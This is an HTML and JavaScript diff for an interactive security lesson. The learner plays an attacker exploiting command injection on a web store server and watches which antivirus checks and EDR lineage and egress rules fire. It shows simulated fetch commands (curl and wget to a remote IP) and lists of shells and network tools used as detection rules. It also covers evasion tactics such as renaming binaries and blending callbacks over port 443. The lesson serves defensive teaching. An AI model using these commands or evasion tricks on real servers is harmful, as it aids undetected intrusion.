@@ -1,0 +1,441 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<link rel="stylesheet" href="_shared.css">
+<style>
+  body { padding: 4px 6px; }
+  .lab { display: grid; grid-template-columns: 1fr 330px; gap: 13px; align-items: start; }
+
+  .colhd { font-size: 10.5px; font-weight: 800; letter-spacing: .14em; text-transform: uppercase;
+    color: #8AA1A8; margin: 0 0 7px; display: flex; align-items: center; gap: 7px; }
+  .colhd .n { display: inline-flex; align-items: center; justify-content: center; width: 15px; height: 15px;
+    border-radius: 50%; background: #00567C; color: #fff; font-size: 9px; letter-spacing: 0; }
+
+  canvas#tree { width: 100%; height: 268px; border: 1px solid #0C3A46; border-radius: 11px; background: #06232B; }
+
+  /* ---- attacker control bar ---- */
+  .rig { margin-top: 9px; border: 1px solid #D3E1E1; border-radius: 11px; background: #fff; padding: 9px 11px; }
+  .rrow { display: flex; align-items: center; gap: 7px; flex-wrap: wrap; margin-bottom: 7px; }
+  .rrow:last-child { margin-bottom: 0; }
+  .rlb { font-size: 9.5px; font-weight: 800; letter-spacing: .1em; text-transform: uppercase; color: #8AA1A8;
+    width: 74px; flex: none; }
+  .chip { font-family: "JetBrains Mono", monospace; font-size: 11px; font-weight: 700; color: #12333D;
+    border: 1px solid #CDD8DA; background: #fff; border-radius: 999px; padding: 5px 11px; cursor: pointer;
+    transition: all 120ms; }
+  .chip:hover { border-color: #8AA1A8; background: #EEF3F3; }
+  .chip.on { background: #D64545; color: #fff; border-color: #D64545; }
+  .chip.tog.on { background: #00567C; border-color: #00567C; }
+
+  /* ---- detection panel ---- */
+  .engine { border: 1px solid #D3E1E1; border-radius: 11px; background: #fff; overflow: hidden; margin-bottom: 10px; }
+  .ehead { display: flex; align-items: center; gap: 8px; padding: 8px 11px; border-bottom: 1px solid #E0E7E8;
+    background: #EEF3F3; }
+  .ehead .en { font-size: 11.5px; font-weight: 800; color: #12333D; letter-spacing: .02em; }
+  .ehead .ev { margin-left: auto; font-family: "JetBrains Mono", monospace; font-size: 9px; font-weight: 700;
+    letter-spacing: .06em; padding: 3px 8px; border-radius: 999px; background: #E6ECEC; color: #8AA1A8; }
+  .ehead .ev.fire { background: #D64545; color: #fff; }
+  .ehead .ev.quiet { background: rgba(242,210,0,.28); color: #8A7500; }
+  .ebody { padding: 9px 11px; font-size: 11px; color: #5C7880; line-height: 1.45; }
+  .ebody b { color: #00567C; }
+
+  .rule { border-bottom: 1px solid #EEF3F3; padding: 8px 11px; transition: background 140ms; }
+  .rule:last-child { border-bottom: 0; }
+  .rule .rn { display: flex; align-items: center; gap: 6px; font-family: "JetBrains Mono", monospace;
+    font-size: 10.5px; font-weight: 700; color: #12333D; }
+  .rule .rn .dot { width: 7px; height: 7px; border-radius: 50%; background: #D6DEDE; flex: none; }
+  .rule .rn .sev { margin-left: auto; font-size: 8.5px; letter-spacing: .05em; color: #8AA1A8; }
+  .rule .rc { font-family: "JetBrains Mono", monospace; font-size: 9.5px; color: #8AA1A8; line-height: 1.5;
+    margin-top: 3px; }
+  .rule .rc .hit  { color: #C1403f; font-weight: 700; }
+  .rule .rc .part { color: #5C7880; font-weight: 700; }
+  .rule.fire { background: rgba(214,69,69,.07); }
+  .rule.fire .rn { color: #C1403f; }
+  .rule.fire .rn .dot { background: #D64545; box-shadow: 0 0 0 3px rgba(214,69,69,.18); }
+  .rule.fire .rn .sev { color: #C1403f; font-weight: 700; }
+
+  .cap { margin-top: 9px; font-size: 12.5px; color: #42606A; line-height: 1.45; min-height: 34px; }
+  .cap b { color: #00567C; } .cap em { color: #1F8F89; font-style: normal; font-weight: 700; }
+  .cap .dngr { color: #D64545; font-weight: 700; }
+</style>
+</head><body>
+
+<div class="lab">
+  <div>
+    <p class="colhd"><span class="n">1</span> What the endpoint agent sees — every process, and its parent</p>
+    <canvas id="tree"></canvas>
+
+    <div class="rig">
+      <div class="rrow"><span class="rlb">Technique</span>
+        <button class="chip on" data-t="shell">spawn a shell</button>
+        <button class="chip" data-t="direct">run the tool directly</button>
+        <button class="chip" data-t="inapp">stay inside the app</button>
+      </div>
+      <div class="rrow"><span class="rlb">Tool</span>
+        <button class="chip on" data-tool="curl">curl</button>
+        <button class="chip" data-tool="wget">wget</button>
+        <button class="chip" data-tool="python3">python3</button>
+        <button class="chip tog" id="rename">rename the binary</button>
+      </div>
+      <div class="rrow"><span class="rlb">Egress</span>
+        <button class="chip tog" id="blend">blend in: 443 → a cloud host</button>
+        <button class="primary" id="run" style="margin-left:auto;font-size:12px;padding:6px 14px">▶ Run the attack</button>
+      </div>
+    </div>
+
+    <div class="cap" id="cap">You are the attacker again. The web server has command injection. Run it, and watch what the
+      endpoint agent records.</div>
+  </div>
+
+  <div>
+    <p class="colhd"><span class="n">2</span> Two engines, same event</p>
+
+    <div class="engine">
+      <div class="ehead"><span class="en">🛡️ Antivirus</span><span class="ev" id="avv">—</span></div>
+      <div class="ebody" id="avb">Scans files. Waiting for a process to run.</div>
+    </div>
+
+    <div class="engine">
+      <div class="ehead"><span class="en">📡 EDR — behavioural rules</span><span class="ev" id="edrv">—</span></div>
+      <div id="rules"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  var $ = function (id) { return document.getElementById(id); };
+  var C = { ink:"#12333D", bad:"#D64545", petrol:"#00567C", teal:"#1F8F89", turq:"#33D3CB",
+            mute:"#5D8C93", dim:"rgba(127,227,220,.45)", yellow:"#F2D200" };
+
+  var state = { tech: "shell", tool: "curl", rename: false, blend: false, ran: false };
+
+  var SHELLS = ["sh", "bash", "dash", "zsh"];
+  var NETTOOLS = ["curl", "wget", "python3", "nc", "ncat"];
+
+  /* ---- build the process tree for the current attacker config -------------- */
+  function buildTree() {
+    var toolName = state.rename ? "krn-updater" : state.tool;
+    var nodes = [];
+    // before the attack runs, the box is simply doing its job
+    if (!state.ran) return [{ img: "php-fpm", pid: 412, arg: "majal-store (worker)", role: "web", legit: true }];
+    if (state.tech === "inapp") {
+      nodes.push({ img: "php-fpm", pid: 412, arg: "majal-store (worker)", role: "web", legit: true });
+    } else if (state.tech === "direct") {
+      nodes.push({ img: "php-fpm", pid: 412, arg: "majal-store (worker)", role: "web", legit: true });
+      nodes.push({ img: toolName, pid: 8802, arg: cmdline(toolName), role: "tool", legit: true });
+    } else {
+      nodes.push({ img: "php-fpm", pid: 412, arg: "majal-store (worker)", role: "web", legit: true });
+      nodes.push({ img: "sh", pid: 8801, arg: "-c \"" + cmdline(toolName) + "\"", role: "shell", legit: true });
+      nodes.push({ img: toolName, pid: 8802, arg: cmdline(toolName), role: "tool", legit: true });
+    }
+    return nodes;
+  }
+  function cmdline(t) {
+    var dst = state.blend ? "storage.cdn-edge.net/x" : "45.147.230.12/x";
+    if (state.tool === "wget")    return t + " -qO- " + dst;
+    if (state.tool === "python3") return t + " -c 'import urllib.request…'";
+    return t + " -s " + dst;
+  }
+  function egress() {
+    return state.blend
+      ? { ip: "104.18.32.7", port: 443, host: "storage.cdn-edge.net", known: true }
+      : { ip: "45.147.230.12", port: 443, host: null, known: false };
+  }
+
+  /* ---- the detection rules ------------------------------------------------- */
+  function evaluate() {
+    var nodes = buildTree(), eg = egress();
+    var toolName = state.rename ? "krn-updater" : state.tool;
+    var parentIsWeb = true;                                  // php-fpm is always the root here
+    var hasShellChild = nodes.some(function (n) { return SHELLS.indexOf(n.img) >= 0; });
+    var hasNetToolChild = nodes.some(function (n) { return n.role === "tool" && NETTOOLS.indexOf(n.img) >= 0; });
+
+    return [
+      { id: "WebServerSpawnsShell", sev: "HIGH",
+        cond: [["parent_image", "∈ {nginx, php-fpm, httpd}", parentIsWeb],
+               ["child_image",  "∈ {sh, bash, dash, zsh}",   hasShellChild]],
+        fire: parentIsWeb && hasShellChild },
+      { id: "WebServerSpawnsNetTool", sev: "MEDIUM",
+        cond: [["parent_image", "∈ {nginx, php-fpm, httpd}",     parentIsWeb],
+               ["child_image",  "∈ {curl, wget, python3, nc}",   hasNetToolChild]],
+        fire: parentIsWeb && hasNetToolChild },
+      { id: "ServerEgressToUnknownIP", sev: "MEDIUM",
+        cond: [["dest_ip", "not in baseline (30d)", !eg.known],
+               ["proc",    "∈ web server tree",     true]],
+        fire: !eg.known }
+    ];
+  }
+
+  /* ---- canvas -------------------------------------------------------------- */
+  var cv = $("tree"), ctx = cv.getContext("2d"), W = 0, H = 268;
+  var anim = 1, raf = null, beacon = 0;   // idle shows the healthy server at rest
+
+  function fit() {
+    var dpr = window.devicePixelRatio || 1;
+    W = cv.clientWidth || 680;
+    cv.width = W * dpr; cv.height = H * dpr;
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    draw();
+  }
+  window.addEventListener("resize", fit);
+
+  function rr(x, y, w, h, r) {
+    ctx.beginPath();
+    ctx.moveTo(x + r, y); ctx.arcTo(x + w, y, x + w, y + h, r);
+    ctx.arcTo(x + w, y + h, x, y + h, r); ctx.arcTo(x, y + h, x, y, r);
+    ctx.arcTo(x, y, x + w, y, r); ctx.closePath();
+  }
+
+  function nodeColor(n, fired) {
+    if (n.role === "web")   return { bd: "#1F8F89", tx: "#7FE3DC", tag: "web server" };
+    if (n.role === "shell") return { bd: fired ? "#D64545" : "#3E6470", tx: fired ? "#FF9B9B" : "#BFE0E2", tag: "shell" };
+    return { bd: fired ? "#D64545" : "#3E6470", tx: fired ? "#FF9B9B" : "#BFE0E2", tag: "process" };
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, W, H);
+    ctx.fillStyle = "#06232B"; ctx.fillRect(0, 0, W, H);
+
+    var nodes = buildTree(), rules = evaluate(), eg = egress();
+    var shellFired = rules[0].fire, toolFired = rules[1].fire, egFired = rules[2].fire;
+
+    var NW = 300, NH = 46, X = 26, gap = 24;
+    var totalH = nodes.length * NH + (nodes.length - 1) * gap;
+    var Y0 = (H - totalH) / 2;
+
+    // ---- tree edges + nodes (staggered reveal by anim 0..1) ----
+    for (var i = 0; i < nodes.length; i++) {
+      var appearAt = i / (nodes.length + 1);
+      var p = clamp((anim - appearAt) / (1 / (nodes.length + 1)), 0, 1);
+      if (p <= 0) continue;
+      var y = Y0 + i * (NH + gap);
+
+      // edge from parent
+      if (i > 0) {
+        var py = y - gap, ex = X + 28;
+        ctx.strokeStyle = "rgba(127,227,220,.35)"; ctx.lineWidth = 1.6;
+        ctx.beginPath(); ctx.moveTo(ex, py); ctx.lineTo(ex, py + gap * p); ctx.stroke();
+        if (p > .85) {  // arrowhead
+          ctx.fillStyle = "rgba(127,227,220,.5)";
+          ctx.beginPath(); ctx.moveTo(ex, y); ctx.lineTo(ex - 3.5, y - 5); ctx.lineTo(ex + 3.5, y - 5); ctx.fill();
+        }
+        // "spawned" label
+        if (p > .6) {
+          ctx.fillStyle = "rgba(127,227,220,.42)";
+          ctx.font = "9px 'JetBrains Mono', Menlo, monospace"; ctx.textAlign = "left"; ctx.textBaseline = "middle";
+          ctx.fillText("execve()", ex + 8, py + gap / 2);
+        }
+      }
+
+      var fired = (nodes[i].role === "shell" && shellFired) || (nodes[i].role === "tool" && toolFired);
+      var col = nodeColor(nodes[i], fired);
+      var a = ease(p);
+
+      ctx.globalAlpha = a;
+      ctx.fillStyle = fired ? "rgba(214,69,69,.12)" : "rgba(255,255,255,.045)";
+      rr(X, y, NW, NH, 9); ctx.fill();
+      ctx.strokeStyle = col.bd; ctx.lineWidth = fired ? 1.8 : 1.2;
+      rr(X, y, NW, NH, 9); ctx.stroke();
+
+      // pid badge
+      ctx.fillStyle = "rgba(255,255,255,.07)";
+      rr(X + 9, y + 9, 46, 17, 5); ctx.fill();
+      ctx.fillStyle = col.tx; ctx.font = "700 9.5px 'JetBrains Mono', Menlo, monospace";
+      ctx.textAlign = "center"; ctx.textBaseline = "middle";
+      ctx.fillText(String(nodes[i].pid), X + 32, y + 18);
+
+      // image name
+      ctx.textAlign = "left";
+      ctx.fillStyle = col.tx; ctx.font = "700 13px 'JetBrains Mono', Menlo, monospace";
+      ctx.fillText(nodes[i].img, X + 64, y + 17);
+      // cmdline
+      ctx.fillStyle = "rgba(191,224,226,.5)"; ctx.font = "10px 'JetBrains Mono', Menlo, monospace";
+      ctx.fillText(trunc(nodes[i].arg, 30), X + 64, y + 33);
+
+      if (fired) {
+        ctx.fillStyle = "#D64545";
+        rr(X + NW - 74, y + 14, 64, 17, 8); ctx.fill();
+        ctx.fillStyle = "#fff"; ctx.font = "700 8.5px 'JetBrains Mono', Menlo, monospace";
+        ctx.textAlign = "center"; ctx.fillText("RULE HIT", X + NW - 42, y + 23);
+      }
+      ctx.globalAlpha = 1;
+    }
+
+    // ---- outbound connection to C2 ----
+    var lastY = Y0 + (nodes.length - 1) * (NH + gap) + NH / 2;
+    var netP = state.ran ? clamp((anim - nodes.length / (nodes.length + 1)) * (nodes.length + 1), 0, 1) : 0;
+    if (netP > 0) {
+      var sx = X + NW, tx = W - 168;
+      ctx.globalAlpha = ease(netP);
+      ctx.strokeStyle = egFired ? "rgba(214,69,69,.5)" : "rgba(127,227,220,.3)";
+      ctx.lineWidth = 1.4; ctx.setLineDash([4, 4]);
+      ctx.beginPath(); ctx.moveTo(sx, lastY); ctx.lineTo(sx + (tx - sx) * netP, lastY); ctx.stroke();
+      ctx.setLineDash([]);
+
+      // remote host box
+      if (netP > .55) {
+        var bw = 152, bh = 44, bx = tx + 6, by = lastY - bh / 2;
+        ctx.fillStyle = egFired ? "rgba(214,69,69,.14)" : "rgba(127,227,220,.08)";
+        rr(bx, by, bw, bh, 9); ctx.fill();
+        ctx.strokeStyle = egFired ? "#D64545" : "#3E6470"; ctx.lineWidth = 1.3;
+        rr(bx, by, bw, bh, 9); ctx.stroke();
+        ctx.textAlign = "center";
+        ctx.fillStyle = egFired ? "#FF9B9B" : "#BFE0E2";
+        ctx.font = "700 11px 'JetBrains Mono', Menlo, monospace";
+        ctx.fillText(eg.host || eg.ip, bx + bw / 2, by + 17);
+        ctx.fillStyle = "rgba(191,224,226,.5)"; ctx.font = "9.5px 'JetBrains Mono', Menlo, monospace";
+        ctx.fillText(eg.known ? ":443 · seen 41,203×/30d" : ":443 · never seen before", bx + bw / 2, by + 31);
+      }
+      // travelling beacon
+      if (netP >= 1) {
+        var bp = (beacon % 1);
+        var px = sx + (tx - sx) * bp;
+        ctx.fillStyle = egFired ? "#D64545" : "#33D3CB";
+        ctx.beginPath(); ctx.arc(px, lastY, 3.4, 0, 7); ctx.fill();
+        ctx.globalAlpha = .3 * ease(netP);
+        ctx.beginPath(); ctx.arc(px, lastY, 7, 0, 7); ctx.fill();
+      }
+      ctx.globalAlpha = 1;
+    }
+
+    // caption strip: what the agent recorded
+    ctx.fillStyle = "rgba(127,227,220,.3)";
+    ctx.font = "9px 'JetBrains Mono', Menlo, monospace"; ctx.textAlign = "left"; ctx.textBaseline = "top";
+    ctx.fillText("edr-agent · majal-store-01 · process + network telemetry", 14, 10);
+
+    if (!state.ran) {
+      ctx.textAlign = "center"; ctx.textBaseline = "middle";
+      ctx.fillStyle = "rgba(127,227,220,.28)";
+      ctx.font = "11px 'JetBrains Mono', Menlo, monospace";
+      ctx.fillText("one process, serving the store — nothing else has run", W / 2, H - 34);
+    }
+  }
+
+  function trunc(s, n) { return s.length > n ? s.slice(0, n - 1) + "…" : s; }
+  function clamp(v, a, b) { return v < a ? a : v > b ? b : v; }
+  function ease(p) { return p * p * (3 - 2 * p); }
+
+  /* ---- rendering the rule panel -------------------------------------------- */
+  function renderRules() {
+    var rules = evaluate(), wrap = $("rules"), html = "";
+    rules.forEach(function (r) {
+      html += '<div class="rule' + (r.fire && state.ran ? " fire" : "") + '">' +
+        '<div class="rn"><span class="dot"></span>' + r.id + '<span class="sev">' + r.sev + '</span></div>' +
+        '<div class="rc">' + r.cond.map(function (c) {
+          var cls = !state.ran || !c[2] ? "" : (r.fire ? "hit" : "part");
+          return '<span class="' + cls + '">' + c[0] + " " + c[1] + '</span>';
+        }).join("<br>&nbsp;&nbsp;AND ") + '</div></div>';
+    });
+    wrap.innerHTML = html;
+
+    var nFired = rules.filter(function (r) { return r.fire; }).length;
+    var ev = $("edrv");
+    if (!state.ran) { ev.className = "ev"; ev.textContent = "—"; }
+    else if (nFired) { ev.className = "ev fire"; ev.textContent = nFired + " ALERT" + (nFired > 1 ? "S" : ""); }
+    else { ev.className = "ev quiet"; ev.textContent = "SILENT"; }
+  }
+
+  function renderAV() {
+    var v = $("avv"), b = $("avb");
+    if (!state.ran) { v.className = "ev"; v.textContent = "—"; b.textContent = "Scans files. Waiting for a process to run."; return; }
+    v.className = "ev quiet"; v.textContent = "NOTHING TO SCAN";
+    var toolName = state.rename ? "krn-updater" : state.tool;
+    if (state.tech === "inapp")
+      b.innerHTML = "No new file was written and no new process started. There is <b>no object to scan</b>.";
+    else if (state.rename)
+      b.innerHTML = "Renaming changed the <em>name</em>, not the <em>bytes</em> — this is still " +
+        "<b>" + state.tool + "</b>, hash for hash, and that hash is on the allow-list. AV waves it through, " +
+        "correctly. It is a legitimate tool.";
+    else
+      b.innerHTML = "<b>" + toolName + "</b> is a legitimate system binary — signed, present on every server, " +
+        "hash on the allow-list. AV has <b>nothing to match</b>. Nobody dropped malware here; " +
+        "the attacker used what was already installed.";
+  }
+
+  /* ---- caption ------------------------------------------------------------- */
+  function caption() {
+    var rules = evaluate(), n = rules.filter(function (r) { return r.fire; }).length;
+    var c = $("cap");
+    if (!state.ran) {
+      c.innerHTML = "You are the attacker again. The web server has command injection. Run it, and watch what the " +
+        "endpoint agent records."; return;
+    }
+    if (state.tech === "shell" && !state.rename && !state.blend)
+      c.innerHTML = "<b>A web server spawned a shell.</b> No malware, no signature — but that <em>parent → child edge</em> " +
+        "is something a store server has never legitimately done. EDR matches the <em>relationship</em>, not the bytes.";
+    else if (state.rename && state.tech !== "inapp")
+      c.innerHTML = "Renaming the binary killed the <b>name-based</b> rule — and did nothing at all to the " +
+        "<b>lineage</b> rule. <span class='dngr'>You cannot rename your way out of who your parent is.</span>";
+    else if (state.tech === "direct")
+      c.innerHTML = "No shell this time — but the web server still started a <b>network tool</b>. Weaker signal, " +
+        "still a signal. Now try <b>stay inside the app</b>.";
+    else if (state.tech === "inapp" && !state.blend)
+      c.innerHTML = "No child process at all — the webshell opens the socket <em>from inside php-fpm</em>. " +
+        "Both lineage rules go quiet. Only the <b>egress</b> rule is left holding the line.";
+    else if (state.tech === "inapp" && state.blend)
+      c.innerHTML = "<span class='dngr'>Silent.</span> No new process; the callback rides 443 to a host the baseline " +
+        "already trusts. <b>This is the ceiling</b> — EDR is not a wall, it raises the cost of being quiet. What is " +
+        "left? <em>Correlation across sources.</em>";
+    else
+      c.innerHTML = n + " rule" + (n === 1 ? "" : "s") + " fired. Keep changing the attack and watch which signal survives.";
+  }
+
+  /* ---- run ----------------------------------------------------------------- */
+  function run(instant) {
+    state.ran = true;
+    if (instant) { anim = 1; beacon = .35; draw(); renderRules(); renderAV(); caption(); return; }
+    anim = 0; beacon = 0;
+    if (raf) cancelAnimationFrame(raf);
+    var t0 = performance.now(), DUR = 1500;
+    renderRules(); renderAV();
+    (function step(now) {
+      var e = now - t0;
+      anim = clamp(e / DUR, 0, 1);
+      beacon = (e / 900) % 1;
+      draw();
+      if (anim < 1) raf = requestAnimationFrame(step);
+      else { renderRules(); renderAV(); caption(); raf = requestAnimationFrame(loop); }
+    })(t0);
+    function loop(now) { beacon = (now / 900) % 1; draw(); raf = requestAnimationFrame(loop); }
+  }
+
+  function resetRun() { state.ran = false; anim = 1; if (raf) cancelAnimationFrame(raf); draw(); renderRules(); renderAV(); caption(); }
+
+  /* ---- controls ------------------------------------------------------------ */
+  document.querySelectorAll("[data-t]").forEach(function (b) {
+    b.addEventListener("click", function () {
+      document.querySelectorAll("[data-t]").forEach(function (x) { x.classList.remove("on"); });
+      b.classList.add("on"); state.tech = b.getAttribute("data-t");
+      run(false);
+    });
+  });
+  document.querySelectorAll("[data-tool]").forEach(function (b) {
+    b.addEventListener("click", function () {
+      document.querySelectorAll("[data-tool]").forEach(function (x) { x.classList.remove("on"); });
+      b.classList.add("on"); state.tool = b.getAttribute("data-tool");
+      run(false);
+    });
+  });
+  $("rename").addEventListener("click", function () {
+    state.rename = !state.rename; this.classList.toggle("on", state.rename); run(false);
+  });
+  $("blend").addEventListener("click", function () {
+    state.blend = !state.blend; this.classList.toggle("on", state.blend); run(false);
+  });
+  $("run").addEventListener("click", function () { run(false); });
+
+  fit(); renderRules(); renderAV();
+
+  /* presenter / screenshot hook: ?state=shell|rename|direct|inapp|ghost */
+  var st = (location.search.match(/state=(\w+)/) || [])[1];
+  if (st) {
+    if (st === "rename") { state.rename = true; $("rename").classList.add("on"); }
+    if (st === "direct") { state.tech = "direct"; }
+    if (st === "inapp")  { state.tech = "inapp"; }
+    if (st === "ghost")  { state.tech = "inapp"; state.blend = true; $("blend").classList.add("on"); }
+    document.querySelectorAll("[data-t]").forEach(function (x) {
+      x.classList.toggle("on", x.getAttribute("data-t") === state.tech); });
+    run(true);
+  }
+})();
+</script>
+</body></html>
